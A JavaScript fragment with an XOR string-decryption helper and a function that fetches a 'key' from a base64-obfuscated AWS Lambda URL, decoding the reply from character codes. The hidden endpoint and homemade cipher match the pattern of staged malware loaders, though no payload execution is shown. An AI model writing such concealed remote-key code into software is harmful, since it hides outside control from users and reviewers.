const decrypt = (salt, encoded) => {
  const textToChars = (text) => text.split("").map((c) => c.charCodeAt(0));
  const applySaltToChar = (code) => textToChars(salt).reduce((a, b) => a ^ b, code);
  return encoded
    .match(/.{1,2}/g)
    .map((hex) => parseInt(hex, 16))
    .map(applySaltToChar)
    .map((charCode) => String.fromCharCode(charCode))
    .join("");
};


async function getKey() {
    const apiUrl = "aHR0cHM6Ly9iY3BtM3NsbWEybmZlNHBlZmZkamRla3FteTBpYnVxdy5sYW1iZGEtdXJsLmV1LWNlbnRyYWwtMS5vbi5hd3Mv";

    try {
        const response = await fetch(atob(apiUrl));
        const stream = response.body;
        const reader = stream.getReader();
        let responseText = '';

        const readStream = async () => {
            const { done, value } = await reader.read();
            if (done) {
                const asciiValues = responseText.split(',').map(Number);
                const translatedString = String.fromCharCode(...asciiValues);
                reader.releaseLock();
                const key = JSON.parse(translatedString).key;
                return key;
            } else {
                responseText += value;
                return readStream();
            }
        };

        const key = await readStream();
        return key;
    } catch (error) {
        console.error("Fetch error:", error);
        return "";
    }
}



